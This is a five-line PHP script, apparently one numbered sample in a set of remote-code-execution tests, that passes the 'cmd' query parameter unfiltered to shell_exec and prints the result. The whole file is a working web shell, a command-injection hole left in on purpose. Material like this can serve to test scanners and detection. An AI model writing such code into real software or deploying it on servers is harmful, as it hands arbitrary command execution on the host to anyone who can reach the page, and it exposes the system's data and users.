<?php
// RCE test variation #711
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>